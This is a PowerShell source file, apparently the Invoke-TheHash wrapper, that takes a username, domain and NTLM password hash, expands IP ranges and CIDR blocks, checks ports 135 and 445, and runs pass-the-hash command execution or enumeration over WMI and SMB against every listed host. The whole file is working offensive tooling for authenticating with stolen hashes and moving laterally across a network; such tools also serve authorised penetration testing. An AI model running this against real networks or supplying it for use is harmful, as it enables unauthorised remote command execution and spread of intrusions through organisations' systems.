function Invoke-TheHash
{

[CmdletBinding(DefaultParametersetName='Default')]
param
(
    [parameter(Mandatory=$true)][Array]$Target,
    [parameter(Mandatory=$false)][Array]$TargetExclude,
    [parameter(ParameterSetName='Auth',Mandatory=$true)][String]$Username,
    [parameter(ParameterSetName='Auth',Mandatory=$false)][String]$Domain,
    [parameter(Mandatory=$false)][ValidateSet("All","NetSession","Share","User","Group")][String]$Action = "All",
    [parameter(Mandatory=$false)][String]$Group = "Administrators",
    [parameter(Mandatory=$false)][String]$Service,
    [parameter(Mandatory=$false)][String]$Command,
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$CommandCOMSPEC="Y",
    [parameter(Mandatory=$true)][ValidateSet("SMBClient","SMBEnum","SMBExec","WMIExec")][String]$Type,
    [parameter(Mandatory=$false)][Int]$PortCheckTimeout = 100,
    [parameter(ParameterSetName='Auth',Mandatory=$true)][ValidateScript({$_.Length -eq 32 -or $_.Length -eq 65})][String]$Hash,
    [parameter(Mandatory=$false)][Switch]$PortCheckDisable,
    [parameter(Mandatory=$false)][Int]$Sleep
)

$target_list = New-Object System.Collections.ArrayList
$target_exclude_list = New-Object System.Collections.ArrayList

if($Type -eq 'WMIExec')
{
    $Sleep = 10
}
else
{
    $Sleep = 150
}

for($i=0;$i -lt $target.Count;$i++)
{

    if($target[$i] -like "*-*")
    {
        $target_array = $target[$i].split("-")

        if($target_array[0] -match "\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b" -and
        $target_array[1] -notmatch "\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b")
        {

            if($target_array.Count -ne 2 -or $target_array[1] -notmatch "^[\d]+$" -or $target_array[1] -gt 254)
            {
                Write-Output "[!] Invalid target $($target[$i])"
                throw
            }
            else
            {
                $IP_network_begin = $target_array[0].ToCharArray()
                [Array]::Reverse($IP_network_begin)
                $IP_network_begin = -join($IP_network_begin)
                $IP_network_begin = $IP_network_begin.SubString($IP_network_begin.IndexOf("."))
                $IP_network_begin = $IP_network_begin.ToCharArray()
                [Array]::Reverse($IP_network_begin)
                $IP_network_begin = -join($IP_network_begin)
                $IP_range_end = $IP_network_begin + $target_array[1]
                $target[$i] = $target_array[0] + "-" + $IP_range_end
            }

        }

    }

}

# math taken from https://gallery.technet.microsoft.com/scriptcenter/List-the-IP-addresses-in-a-60c5bb6b

function Convert-RangetoIPList
{
    param($IP,$CIDR,$Start,$End)

    function Convert-IPtoINT64
    { 
        param($IP) 
        
        $octets = $IP.split(".")

        return [int64]([int64]$octets[0] * 16777216 + [int64]$octets[1]*65536 + [int64]$octets[2] * 256 + [int64]$octets[3]) 
    } 
    
    function Convert-INT64toIP
    { 
        param ([int64]$int) 
        return (([math]::truncate($int/16777216)).tostring() + "." +([math]::truncate(($int%16777216)/65536)).tostring() + "." + ([math]::truncate(($int%65536)/256)).tostring() + "." +([math]::truncate($int%256)).tostring())
    }

    $target_list = New-Object System.Collections.ArrayList
    
    if($IP)
    {
        $IP_address = [System.Net.IPAddress]::Parse($IP)
    }

    if($CIDR)
    {
        $mask_address = [System.Net.IPAddress]::Parse((Convert-INT64toIP -int ([convert]::ToInt64(("1" * $CIDR + "0" * (32 - $CIDR)),2))))
    }

    if($IP)
    {
        $network_address = New-Object System.Net.IPAddress ($mask_address.address -band $IP_address.address)
    }

    if($IP)
    {
        $broadcast_address = New-Object System.Net.IPAddress (([System.Net.IPAddress]::parse("255.255.255.255").address -bxor $mask_address.address -bor $network_address.address))
    } 
    
    if($IP)
    { 
        $start_address = Convert-IPtoINT64 -ip $network_address.IPAddressToString
        $end_address = Convert-IPtoINT64 -ip $broadcast_address.IPAddressToString
    }
    else
    { 
        $start_address = Convert-IPtoINT64 -ip $start 
        $end_address = Convert-IPtoINT64 -ip $end 
    } 
    
    for($i = $start_address; $i -le $end_address; $i++) 
    { 
        $IP_address = Convert-INT64toIP -int $i
        $target_list.Add($IP_address) > $null
    }

    if($network_address)
    {
        $target_list.Remove($network_address.IPAddressToString)
    }

    if($broadcast_address)
    {
        $target_list.Remove($broadcast_address.IPAddressToString)
    }
    
    return $target_list
}

function Get-TargetList
{
    param($targets)

    $target_list = New-Object System.Collections.ArrayList

    ForEach($entry in $targets)
    {
        $entry_split = $null

        if($entry.contains("/"))
        {
            $entry_split = $entry.Split("/")
            $IP = $entry_split[0]
            $CIDR = $entry_split[1]
            $target_list.AddRange($(Convert-RangetoIPList -IP $IP -CIDR $CIDR))
        }
        elseif($entry.contains("-"))
        {
            $entry_split = $entry.Split("-")

            if($entry_split[0] -match "\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b" -and
            $entry_split[1] -match "\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b")
            {
                $start_address = $entry_split[0]
                $end_address = $entry_split[1]
                $target_list.AddRange($(Convert-RangetoIPList -Start $start_address -End $end_address))
            }
            else
            {
                $target_list.Add($entry) > $null    
            }
            
        }
        else
        {
            $target_list.Add($entry) > $null
        }

    }

    return $target_list
}

[Array]$target_list = Get-TargetList $Target

if($TargetExclude)
{
    $target_exclude_list = Get-TargetList $TargetExclude
    $target_list = Compare-Object -ReferenceObject $target_exclude_list -DifferenceObject $target_list -PassThru
}

if($target_list.Count -gt 0)
{

    foreach($target_host in $target_list)
    {
        Write-Verbose "[*] Targeting $target_host"

        if($type -eq 'WMIExec')
        {

            if(!$PortCheckDisable)
            {
                $WMI_port_test = New-Object System.Net.Sockets.TCPClient
                $WMI_port_test_result = $WMI_port_test.BeginConnect($target_host,"135",$null,$null)
                $WMI_port_test_success = $WMI_port_test_result.AsyncWaitHandle.WaitOne($PortCheckTimeout,$false)
                $WMI_port_test.Close()
            }

            if($WMI_port_test_success -or $PortCheckDisable)
            {
                Invoke-WMIExec -username $Username -domain $Domain -hash $Hash -command $Command -target $target_host -sleep $Sleep -Verbose:$VerbosePreference
            }

        }
        elseif($Type -like 'SMB*')
        {

            if(!$PortCheckDisable)
            {
                $SMB_port_test = New-Object System.Net.Sockets.TCPClient
                $SMB_port_test_result = $SMB_port_test.BeginConnect($target_host,"445",$null,$null)
                $SMB_port_test_success = $SMB_port_test_result.AsyncWaitHandle.WaitOne($PortCheckTimeout,$false)
                $SMB_port_test.Close()
            }

            if($SMB_port_test_success -or $PortCheckDisable)
            {

                switch($Type)
                {

                    'SMBClient'
                    {

                        $source = "\\" + $target_host + "\c$"

                        if($PsCmdlet.ParameterSetName -eq 'Auth')
                        {
                            Invoke-SMBClient -username $Username -domain $Domain -hash $Hash -source $source -sleep $Sleep -Verbose:$VerbosePreference
                        }
                        else
                        {
                            Invoke-SMBClient -source $source -sleep $Sleep -Verbose:$VerbosePreference
                        }

                    }

                    'SMBEnum'
                    {

                        if($PsCmdlet.ParameterSetName -eq 'Auth')
                        {
                            Invoke-SMBEnum -username $Username -domain $Domain -hash $Hash -target $target_host -sleep $Sleep -Action $Action -TargetShow -Verbose:$VerbosePreference
                        }
                        else
                        {
                            Invoke-SMBEnum -target $target_host -sleep $Sleep -Verbose:$VerbosePreference
                        }

                    }

                    'SMBExec'
                    {

                        if($PsCmdlet.ParameterSetName -eq 'Auth')
                        {
                            Invoke-SMBExec -username $Username -domain $Domain -hash $Hash -command $Command -CommandCOMSPEC $CommandCOMSPEC -Service $Service -target $target_host -sleep $Sleep -Verbose:$VerbosePreference
                        }
                        else
                        {
                            Invoke-SMBExec -target $target_host -sleep $Sleep -Verbose:$VerbosePreference
                        }

                    }

                }

            }

        }

    }
     
}
else
{
    Write-Output "[-] Target list is empty"    
}

}
